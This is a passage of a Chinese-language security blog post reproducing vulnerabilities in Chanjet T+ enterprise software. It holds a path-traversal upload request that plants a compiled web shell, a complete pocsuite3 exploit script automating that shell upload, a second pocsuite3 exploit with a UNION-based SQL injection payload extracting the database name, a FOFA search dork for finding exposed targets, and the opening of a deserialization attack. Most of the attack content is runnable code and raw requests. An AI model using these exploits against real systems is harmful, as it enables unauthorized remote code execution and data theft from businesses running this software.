filename=&quot;../../../bin/App_Web_shell.aspx.cdcab7d2.dll&quot;</span><br><span class="hljs-comment">Content-Type: image/jpeg</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">MZ�</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs csharp">POST /tplus/SM/SetupAccount/Upload.aspx?preload=<span class="hljs-number">1</span> HTTP/<span class="hljs-number">1.1</span><br>Host: <span class="hljs-number">192.168</span><span class="hljs-number">.150</span><span class="hljs-number">.176</span>:<span class="hljs-number">8080</span><br>User-Agent: Mozilla/<span class="hljs-number">5.0</span> (Windows NT <span class="hljs-number">10.0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537.36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">86.0</span><span class="hljs-number">.4240</span><span class="hljs-number">.198</span> Safari/<span class="hljs-number">537.36</span><br>Accept-Encoding: gzip, deflate<br>Accept: *<span class="hljs-comment">/*</span><br><span class="hljs-comment">Connection: close</span><br><span class="hljs-comment">Content-Length: 501</span><br><span class="hljs-comment">Content-Type: multipart/form-data; boundary=f997dd0c507551811a4e900e363e8f34</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">--f997dd0c507551811a4e900e363e8f34</span><br><span class="hljs-comment">Content-Disposition: form-data; name=&quot;File1&quot;; filename=&quot;../../../bin/shell.aspx.cdcab7d2.compiled&quot;</span><br><span class="hljs-comment">Content-Type: image/jpeg</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">﻿&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="hljs-comment">&lt;preserve resultType=&quot;3&quot; virtualPath=&quot;/shell.aspx&quot; hash=&quot;88eec7b1a&quot; filehash=&quot;1c19382c628a&quot; flags=&quot;110000&quot; assembly=&quot;App_Web_shell.aspx.cdcab7d2&quot; type=&quot;ASP.shell_aspx&quot;&gt;</span><br><span class="hljs-comment">    &lt;filedeps&gt;</span><br><span class="hljs-comment">        &lt;filedep name=&quot;/shell.aspx&quot; /&gt;</span><br><span class="hljs-comment">    &lt;/filedeps&gt;</span><br><span class="hljs-comment">&lt;/preserve&gt;</span><br><span class="hljs-comment">--f997dd0c507551811a4e900e363e8f34--</span><br><span class="hljs-comment"></span><br></code></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/602008/1692454663078-f969fd6d-05a7-4b89-b603-12c008ed2e52.png#averageHue=%23f6f5f4&clientId=ua5f27331-d912-4&from=paste&height=243&id=u2b728a51&originHeight=304&originWidth=1130&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=48601&status=done&style=none&taskId=u864aa4f2-7359-474e-809b-97171f86089&title=&width=904" srcset="/img/loading.gif" lazyload alt="image.png"><br>上传成功。注意：不能和同目录文件装名字，否则会导致失败。<br>默认访问会跳转，需要加上绕过请求<br><img src="https://cdn.nlark.com/yuque/0/2023/png/602008/1692454771166-143803c8-e800-4b00-bac9-84ea72b838cb.png#averageHue=%23fefefe&clientId=ua5f27331-d912-4&from=paste&height=429&id=u2d09a015&originHeight=536&originWidth=1714&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=19027&status=done&style=none&taskId=u386ac71a-021b-4540-a566-22f9a10c6e4&title=&width=1371.2" srcset="/img/loading.gif" lazyload alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/602008/1692454780366-60c3e88b-24d4-43e7-8ec5-49dc45c3e2b5.png#averageHue=%23f4f4f3&clientId=ua5f27331-d912-4&from=paste&height=393&id=u3227a122&originHeight=491&originWidth=794&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=37797&status=done&style=none&taskId=u77e4f3b5-ea65-4be4-bc27-7e7c58baba4&title=&width=635.2" srcset="/img/loading.gif" lazyload alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/602008/1692454791550-a1085876-76bb-41e0-ae70-41e21712e336.png#averageHue=%23232323&clientId=ua5f27331-d912-4&from=paste&height=671&id=ude1767dd&originHeight=839&originWidth=1302&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=36821&status=done&style=none&taskId=uf70f4a57-7e94-4c7b-90bf-00b426fa118&title=&width=1041.6" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<h4 id="Poc3"><a href="#Poc3" class="headerlink" title="Poc3"></a>Poc3</h4><p><img src="https://cdn.nlark.com/yuque/0/2023/png/602008/1692455486652-744a8709-7d2f-46f7-a851-9d29a4b60141.png#averageHue=%23131313&clientId=u92c314b1-1944-4&from=paste&height=494&id=ub2690e70&originHeight=617&originWidth=1818&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=86432&status=done&style=none&taskId=u65acf04f-7ed7-4ef7-a584-c3ff291f63d&title=&width=1454.4" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-meta">#!/usr/bin/env python3</span><br><span class="hljs-meta"># -*- coding: utf-8 -*-</span><br><br><span class="hljs-keyword">from</span> pocsuite3.<span class="hljs-function">api <span class="hljs-title">import</span> (<span class="hljs-params"></span></span><br><span class="hljs-params"><span class="hljs-function">    minimum_version_required, POCBase, register_poc, requests, logger,</span></span><br><span class="hljs-params"><span class="hljs-function">    OptString, OrderedDict,</span></span><br><span class="hljs-params"><span class="hljs-function">    random_str</span></span><br><span class="hljs-params"><span class="hljs-function"></span>)</span><br><span class="hljs-function">import re</span><br><span class="hljs-function"><span class="hljs-title">minimum_version_required</span>(<span class="hljs-params"><span class="hljs-string">&#x27;1.9.6&#x27;</span></span>)</span><br><span class="hljs-function"></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-keyword">class</span> <span class="hljs-title">DemoPOC</span>(<span class="hljs-params">POCBase</span>):</span><br><span class="hljs-function">    vulID</span> = <span class="hljs-string">&#x27;SSV-99649&#x27;</span><br>    version = <span class="hljs-string">&#x27;1&#x27;</span><br>    author = <span class="hljs-string">&#x27;&#x27;</span><br>    vulDate = <span class="hljs-string">&#x27;2022-8-29&#x27;</span><br>    createDate = <span class="hljs-string">&#x27;2023-08-23&#x27;</span><br>    updateDate = <span class="hljs-string">&#x27;2023-08-23&#x27;</span><br>    references = []<br>    name = <span class="hljs-string">&#x27;畅捷通T+ upload (CNVD-2022-60632)&#x27;</span><br>    appPowerLink = <span class="hljs-string">&#x27;https://www.chanjetvip.com&#x27;</span><br>    appName = <span class="hljs-string">&#x27;畅捷通T+&#x27;</span><br>    appVersion = <span class="hljs-string">&#x27;畅捷通T+单机版&lt;=17.0且使用IIS10.0以下版本&#x27;</span><br>    vulType = <span class="hljs-string">&#x27;Arbitrary File Read&#x27;</span><br>    desc = <span class="hljs-string">&#x27;Vulnerability description&#x27;</span><br>    samples = [<span class="hljs-string">&#x27;&#x27;</span>]<br>    install_requires = [<span class="hljs-string">&#x27;&#x27;</span>]<br>    pocDesc = <span class="hljs-string">&#x27;User manual of poc&#x27;</span><br>    dork = &#123;<span class="hljs-string">&#x27;fofa&#x27;</span>: <span class="hljs-string">&#x27;app=&quot;畅捷通-TPlus&quot;&#x27;</span>&#125;<br>    suricata_request = <span class="hljs-string">&#x27;&#x27;</span><br>    suricata_response = <span class="hljs-string">&#x27;&#x27;</span><br><br>    def _options(self):<br>        o = OrderedDict()<br>        o[<span class="hljs-string">&#x27;file_dll&#x27;</span>] = OptString(<span class="hljs-string">&#x27;&#x27;</span>, description=<span class="hljs-string">&#x27;dll文件&#x27;</span>)<br>        o[<span class="hljs-string">&#x27;file_compiled&#x27;</span>] = OptString(<span class="hljs-string">&#x27;&#x27;</span>, description=<span class="hljs-string">&#x27;compiled文件&#x27;</span>)<br>        <span class="hljs-keyword">return</span> o<br><br>    def _verify(self):<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self._check(dork=<span class="hljs-string">&#x27;&#x27;</span>):<br>            <span class="hljs-keyword">return</span> False<br>        result = &#123;&#125;<br>        path = <span class="hljs-string">&quot;/tplus/SM/SetupAccount/Upload.aspx?preload=1&quot;</span><br>        headers = &#123;<br>            <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36&#x27;</span>,<br>        &#125;<br>        url = self.url + path<br>        req = requests.post(url=url,headers=headers)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;无标题页&quot;</span> <span class="hljs-keyword">in</span> req.text <span class="hljs-keyword">and</span> req.status_code == <span class="hljs-number">200</span>:<br>            result[<span class="hljs-string">&#x27;VerifyInfo&#x27;</span>] = &#123;&#125;<br>            result[<span class="hljs-string">&#x27;VerifyInfo&#x27;</span>][<span class="hljs-string">&#x27;URL&#x27;</span>] = self.url<br>        <span class="hljs-keyword">return</span> self.parse_output(result)<br><br>    def _attack(self):<br>        result = &#123;&#125;<br>        path = <span class="hljs-string">&quot;/tplus/SM/SetupAccount/Upload.aspx?preload=1&quot;</span><br>        headers = &#123;<br>            <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36&#x27;</span>,<br>        &#125;<br>        url = self.url + path<br>        filename_compiled = self.get_option(<span class="hljs-string">&#x27;file_compiled&#x27;</span>)<br>        filename_dll = self.get_option(<span class="hljs-string">&#x27;file_dll&#x27;</span>)<br>        <span class="hljs-meta">#res = self._exploit(filename_compiled,filename_dll)</span><br>        file_dlls = re.findall(r<span class="hljs-string">&quot;[\w.]+\.dll&quot;</span>, filename_dll)<br>        file_cmps = re.findall(r<span class="hljs-string">&quot;[\w.]+\.compiled&quot;</span>, filename_compiled)<br>        file_shell = re.findall(r<span class="hljs-string">&quot;[\w.]+\.aspx&quot;</span>, filename_compiled)<br><br>        files1 = &#123;<span class="hljs-string">&quot;File1&quot;</span>: (<span class="hljs-string">&quot;../../../bin/&quot;</span> + file_dlls[<span class="hljs-number">0</span>], open(filename_dll, <span class="hljs-string">&quot;rb&quot;</span>), <span class="hljs-string">&quot;image/jpeg&quot;</span>)&#125;<br>        resq_0 = requests.post(url=url, headers=headers, files=files1, timeout=<span class="hljs-number">10000</span>)<br><br>        files2 = &#123;<span class="hljs-string">&quot;File1&quot;</span>: (<span class="hljs-string">&quot;../../../bin/&quot;</span> + file_cmps[<span class="hljs-number">0</span>], open(filename_compiled, <span class="hljs-string">&quot;rb&quot;</span>), <span class="hljs-string">&quot;image/jpeg&quot;</span>)&#125;<br>        resq_1 = requests.post(url=url, headers=headers, files=files2, timeout=<span class="hljs-number">10000</span>)<br>        <span class="hljs-keyword">if</span> resq_0.status_code == <span class="hljs-number">200</span> <span class="hljs-keyword">and</span> resq_1.status_code == <span class="hljs-number">200</span>:<br>            res = requests.<span class="hljs-keyword">get</span>(url=self.url + <span class="hljs-string">&quot;/tplus/&quot;</span> + file_shell[<span class="hljs-number">0</span>] + <span class="hljs-string">&quot;?preload=1&quot;</span>, headers=headers)<br>            result[<span class="hljs-string">&#x27;VerifyInfo&#x27;</span>] = &#123;&#125;<br>            result[<span class="hljs-string">&#x27;VerifyInfo&#x27;</span>][<span class="hljs-string">&#x27;URL&#x27;</span>] = self.url<br>            result[<span class="hljs-string">&#x27;VerifyInfo&#x27;</span>][<span class="hljs-string">&#x27;Shell&#x27;</span>] = self.url + <span class="hljs-string">&quot;/tplus/&quot;</span> + file_shell[<span class="hljs-number">0</span>] + <span class="hljs-string">&quot;?preload=1&quot;</span><br>        <span class="hljs-keyword">return</span> self.parse_output(result)<br><br>    def _shell(self):<br>        <span class="hljs-keyword">return</span> self._verify()<br><br><br>register_poc(DemoPOC)<br><br></code></pre></td></tr></table></figure>
+<h3 id="畅捷通T-SQL注入漏洞复现（QVD-2023-13612）"><a href="#畅捷通T-SQL注入漏洞复现（QVD-2023-13612）" class="headerlink" title="畅捷通T+ SQL注入漏洞复现（QVD-2023-13612）"></a>畅捷通T+ SQL注入漏洞复现（QVD-2023-13612）</h3><h4 id="漏洞描述-1"><a href="#漏洞描述-1" class="headerlink" title="漏洞描述"></a>漏洞描述</h4><pre><code class="hljs"> 畅捷通 T+ 是一款基于互联网的新型企业管理软件，功能模块包括：财务管理、采购管理、库存管理等。主要针对中小型工贸和商贸企业的财务业务一体化应用，融入了社交化、移动化、物联网、电子商务、互联网信息订阅等元素
+</code></pre>
+<p> 畅捷通T+的某后台功能点只校验了权限，未对用户的输入进行过滤，导致在权限绕过后存在SQL注入漏洞，利用此漏洞攻击者最终可以实现远程命令执行。</p>
+<h4 id="影响版本-1"><a href="#影响版本-1" class="headerlink" title="影响版本"></a>影响版本</h4><p>   畅捷通T+ 13.0<br>   畅捷通T+ 16.0</p>
+<h4 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>POC</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs csharp">POST /tplus/ajaxpro/Ufida.T.SM.UIP.MultiCompanyController,Ufida.T.SM.UIP.ashx?method=CheckMutex HTTP/<span class="hljs-number">1.1</span><br>Host: your-ip<br>Accept: *<span class="hljs-comment">/*</span><br><span class="hljs-comment">Accept-Encoding: gzip, deflate</span><br><span class="hljs-comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="hljs-comment">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0</span><br><span class="hljs-comment"> </span><br><span class="hljs-comment">&#123;&quot;accNum&quot;: &quot;3&#x27;&quot;, &quot;functionTag&quot;: &quot;SYS0104&quot;, &quot;url&quot;: &quot;&quot;&#125;</span><br><span class="hljs-comment"></span><br></code></pre></td></tr></table></figure>
+<p>从路由上来反编译漏洞文件。<br><code>Ufida.T.SM.UP.dll/MultiCompanyController</code><br>AjaxMethod方法<br>这段代码是一个C#方法，用于检查互斥锁。根据传入的参数，它会调用互斥锁服务来注册一个函数，同时还会检查用户的功能权限。如果发生了互斥锁异常（MutexException），则返回该异常的消息；如果发生了其他异常，则返回该异常的消息；否则返回空字符串。</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs csharp">[<span class="hljs-meta">AjaxMethod</span>]<br><span class="hljs-comment">//三个字符串参数url、accNum、functionTag</span><br>		<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span> <span class="hljs-title">CheckMutex</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> url, <span class="hljs-built_in">string</span> accNum, <span class="hljs-built_in">string</span> functionTag</span>)</span><br>		&#123;<br>            <span class="hljs-comment">//进程同步，促进依赖注入获取服务</span><br>			IMutex mutex = ServiceFactory.getService() <span class="hljs-keyword">as</span> IMutex;<br>			<span class="hljs-keyword">try</span><br>			&#123;<br>                <span class="hljs-comment">//如果functionTag参数为SYS0104进入判断</span><br>				<span class="hljs-keyword">if</span> (functionTag == <span class="hljs-string">&quot;SYS0104&quot;</span>)<br>				&#123;<br>                    <span class="hljs-comment">//寻找CheckUserFunction</span><br>					mutex.CheckUserFunction(accNum);<br>				&#125;<br>				mutex.RegisterFunction(url, accNum, functionTag);<br>			&#125;<br>			<span class="hljs-keyword">catch</span> (MutexException ex)<br>			&#123;<br>				<span class="hljs-keyword">return</span> ex.MutexMessage;<br>			&#125;<br>			<span class="hljs-keyword">catch</span> (Exception ex2)<br>			&#123;<br>				<span class="hljs-keyword">return</span> ex2.Message;<br>			&#125;<br>			<span class="hljs-keyword">return</span> <span class="hljs-built_in">string</span>.Empty;<br>		&#125;<br></code></pre></td></tr></table></figure>
+<p>没找到具体的漏洞原因语句。<br>直接上sqlmap<br><img src="https://cdn.nlark.com/yuque/0/2023/png/602008/1692523255564-bdffd7b6-3286-4528-92d2-2dc9ee1085ff.png#averageHue=%231e1e1e&clientId=u7ce150a9-92f4-4&from=paste&height=634&id=uc4ba528e&originHeight=792&originWidth=1483&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=145948&status=done&style=none&taskId=ua823a530-5209-4695-b2d7-2584be8b869&title=&width=1186.4" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<h4 id="POC3"><a href="#POC3" class="headerlink" title="POC3"></a>POC3</h4><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-meta">#!/usr/bin/env python3</span><br><span class="hljs-meta"># -*- coding: utf-8 -*-</span><br><br><span class="hljs-keyword">from</span> pocsuite3.<span class="hljs-function">api <span class="hljs-title">import</span> (<span class="hljs-params"></span></span><br><span class="hljs-params"><span class="hljs-function">    minimum_version_required, POCBase, register_poc, requests, logger,</span></span><br><span class="hljs-params"><span class="hljs-function">    OptString, OrderedDict,</span></span><br><span class="hljs-params"><span class="hljs-function">    random_str,</span></span><br><span class="hljs-params"><span class="hljs-function"></span>)</span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">minimum_version_required</span>(<span class="hljs-params"><span class="hljs-string">&#x27;1.9.6&#x27;</span></span>)</span><br><span class="hljs-function"></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-keyword">class</span> <span class="hljs-title">DemoPOC</span>(<span class="hljs-params">POCBase</span>):</span><br><span class="hljs-function">    vulID</span> = <span class="hljs-string">&#x27;0&#x27;</span><br>    version = <span class="hljs-string">&#x27;1&#x27;</span><br>    author = <span class="hljs-string">&#x27;0&#x27;</span><br>    vulDate = <span class="hljs-string">&#x27;2023-02-10&#x27;</span><br>    createDate = <span class="hljs-string">&#x27;2023-08-20&#x27;</span><br>    updateDate = <span class="hljs-string">&#x27;2023-08-20&#x27;</span><br>    references = [<span class="hljs-string">&#x27;https://nox.qianxin.com/article/604&#x27;</span>]<br>    name = <span class="hljs-string">&#x27;畅捷通 T+ SQL注入漏洞(QVD-2023-13612)&#x27;</span><br>    appPowerLink = <span class="hljs-string">&#x27;https://www.chanjetvip.com&#x27;</span><br>    appName = <span class="hljs-string">&#x27;畅捷通&#x27;</span><br>    appVersion = <span class="hljs-string">&#x27;畅捷通T+ 13.0,畅捷通T+ 16.0&#x27;</span><br>    vulType = <span class="hljs-string">&#x27;SQL Injection&#x27;</span><br>    desc = <span class="hljs-string">&#x27;Vulnerability description&#x27;</span><br>    samples = [<span class="hljs-string">&#x27;&#x27;</span>]<br>    install_requires = [<span class="hljs-string">&#x27;&#x27;</span>]<br>    pocDesc = <span class="hljs-string">&#x27;User manual of poc&#x27;</span><br>    dork = &#123;<span class="hljs-string">&#x27;fofa&#x27;</span>: <span class="hljs-string">&#x27;app=&quot;畅捷通-TPlus&quot;&#x27;</span>&#125;<br>    suricata_request = <span class="hljs-string">&#x27;&#x27;</span><br>    suricata_response = <span class="hljs-string">&#x27;&#x27;</span><br><br>    def _options(self):<br>        o = OrderedDict()<br>        o[<span class="hljs-string">&#x27;param&#x27;</span>] = OptString(<span class="hljs-string">&#x27;&#x27;</span>, description=<span class="hljs-string">&#x27;The param&#x27;</span>)<br>        <span class="hljs-keyword">return</span> o<br><br>    def _exploit(self, param=<span class="hljs-string">&#x27;&#x27;</span>):<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self._check(dork=<span class="hljs-string">&#x27;&#x27;</span>):<br>            <span class="hljs-keyword">return</span> False<br><br>        sql_url = <span class="hljs-string">&quot;/tplus/ajaxpro/Ufida.T.SM.UIP.MultiCompanyController,Ufida.T.SM.UIP.ashx?method=CheckMutex&quot;</span><br>        headers = &#123;<br>            <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/application/json&#x27;</span>,<br>            <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36&#x27;</span>&#125;<br>        payload = &#123;<span class="hljs-string">&quot;accNum&quot;</span>: <span class="hljs-string">&quot;3&#x27; UNION ALL SELECT CHAR(113)+CHAR(113)+CHAR(113)+CHAR(112)+CHAR(113)+ISNULL(CAST(DB_NAME() AS VARCHAR(4000)),CHAR(32))+CHAR(113)+CHAR(98)+CHAR(106)+CHAR(106)+CHAR(113),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- TIKB&quot;</span>, <span class="hljs-string">&quot;functionTag&quot;</span>: <span class="hljs-string">&quot;SYS0104&quot;</span>, <span class="hljs-string">&quot;url&quot;</span>: <span class="hljs-string">&quot;&quot;</span>&#125;<br>        res = requests.post(self.url + sql_url, headers=headers, json=payload)<br>        logger.debug(res.text)<br>        <span class="hljs-keyword">return</span> res<br><br>    def _verify(self):<br>        result = &#123;&#125;<br>        param = <span class="hljs-string">&#x27;&#x27;</span><br>        res = self._exploit(param)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;在将 varchar 值&quot;</span> <span class="hljs-keyword">in</span> res.text:<br>            db_name = res.json()<br>            result[<span class="hljs-string">&#x27;VerifyInfo&#x27;</span>] = &#123;&#125;<br>            result[<span class="hljs-string">&#x27;VerifyInfo&#x27;</span>][<span class="hljs-string">&#x27;URL&#x27;</span>] = self.url<br>            result[<span class="hljs-string">&#x27;VerifyInfo&#x27;</span>][param] = db_name[<span class="hljs-string">&#x27;value&#x27;</span>]<br>            result[<span class="hljs-string">&#x27;VerifyInfo&#x27;</span>][<span class="hljs-string">&#x27;docs&#x27;</span>] = <span class="hljs-string">&quot;保存SQlmap进行后续&quot;</span><br>        <span class="hljs-keyword">return</span> self.parse_output(result)<br><br>    def _attack(self):<br>        result = &#123;&#125;<br>        param = self.get_option(<span class="hljs-string">&#x27;param&#x27;</span>)<br>        res = self._exploit(param)<br>        result[<span class="hljs-string">&#x27;VerifyInfo&#x27;</span>] = &#123;&#125;<br>        result[<span class="hljs-string">&#x27;VerifyInfo&#x27;</span>][<span class="hljs-string">&#x27;URL&#x27;</span>] = self.url<br>        result[<span class="hljs-string">&#x27;VerifyInfo&#x27;</span>][param] = res<br>        <span class="hljs-keyword">return</span> self.parse_output(result)<br><br>    def _shell(self):<br>        <span class="hljs-keyword">return</span> self._verify()<br><br><br>register_poc(DemoPOC)<br><br></code></pre></td></tr></table></figure>
+
+<h3 id="畅捷通T-反序列化漏洞复现（QVD-2023-13615）"><a href="#畅捷通T-反序列化漏洞复现（QVD-2023-13615）" class="headerlink" title="畅捷通T+ 反序列化漏洞复现（QVD-2023-13615）"></a>畅捷通T+ 反序列化漏洞复现（QVD-2023-13615）</h3><h4 id="漏洞描述-2"><a href="#漏洞描述-2" class="headerlink" title="漏洞描述"></a>漏洞描述</h4><pre><code class="hljs">   畅捷通 T+ 是一款基于互联网的新型企业管理软件，功能模块包括：财务管理、采购管理、库存管理等。主要针对中小型工贸和商贸企业的财务业务一体化应用，融入了社交化、移动化、物联网、电子商务、互联网信息订阅等元素。
+   畅捷通 T+ 存在.net反序列化漏洞，未经过身份认证的攻击者可以通过构造恶意的序列化请求在目标服务器上执行任意命令。
+</code></pre>
+<h4 id="影响版本-2"><a href="#影响版本-2" class="headerlink" title="影响版本"></a>影响版本</h4><pre><code class="hljs">  畅捷通 T+ 13.0
+  畅捷通 T+ 16.0
+</code></pre>
+<h4 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>PS:X-Ajaxpro-Method：用于指定在Ajax请求中要调用的服务器端方法的名称</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs csharp">POST /tplus/ajaxpro/Ufida.T.CodeBehind._PriorityLevel,App_Code.ashx?method=GetStoreWarehouseByStore HTTP/<span class="hljs-number">1.1</span><br>Host: your-ip<br>X-Ajaxpro-Method: GetStoreWarehouseByStore<br> <br>&#123;<br>  <span class="hljs-string">&quot;storeID&quot;</span>:&#123;&#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>翻看源代码</p>
